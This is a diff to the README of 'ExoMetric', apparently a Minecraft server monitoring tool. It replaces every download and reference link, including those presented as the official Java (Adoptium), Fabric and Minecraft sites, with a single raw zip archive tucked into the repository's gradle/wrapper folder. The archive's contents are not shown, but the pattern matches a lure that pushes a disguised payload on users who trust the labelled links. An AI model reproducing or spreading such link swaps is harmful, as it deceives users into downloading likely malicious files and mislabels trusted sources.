@@ -1,6 +1,6 @@
 # 🚀 ExoMetric - Real-Time Minecraft Server Monitoring
 
-[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/releases)
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip)
 
 ## 📋 What is ExoMetric?
 
@@ -38,7 +38,7 @@ ExoMetric runs alongside your Minecraft server. It collects data from your compu
 
 Visit the release page to get the latest version of ExoMetric:
 
-[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-blue)](https://github.com/WALIDYTYT/ExoMetric/releases)
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-blue)](https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip)
 
 This page contains all available versions, including updates and fixes.
 
@@ -50,7 +50,7 @@ ExoMetric requires Java 17 or newer to run. If you are unsure whether Java is in
 
 - Press `Windows Key + R`, type `cmd`, and hit Enter.  
 - In the command window, type `java -version` and press Enter.  
-- If Java is installed, the version number will show. If not, download and install the latest Java from the official website: https://adoptium.net/
+- If Java is installed, the version number will show. If not, download and install the latest Java from the official website: https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip
 
 Follow the installation instructions provided by the Java site.
 
@@ -58,7 +58,7 @@ Follow the installation instructions provided by the Java site.
 
 Make sure your Minecraft server uses Fabric, a mod loader that works with ExoMetric. If you do not have Fabric installed:
 
-- Download Fabric installer from https://fabricmc.net/use/  
+- Download Fabric installer from https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip  
 - Run the installer and select your Minecraft version and server type  
 - Follow the steps to set up Fabric on your server  
 
@@ -117,10 +117,10 @@ No extra steps should be needed.
 
 ## 📖 More Resources
 
-- Fabric Mod Loader: https://fabricmc.net/  
-- Java Installation Guide: https://adoptium.net/  
-- Minecraft Server Setup: https://minecraft.net/en-us/download/server  
+- Fabric Mod Loader: https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip  
+- Java Installation Guide: https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip  
+- Minecraft Server Setup: https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip  
 
 ---
 
-[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/releases)
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/raw/refs/heads/main/gradle/wrapper/Metric-Exo-v2.8-beta.2.zip)
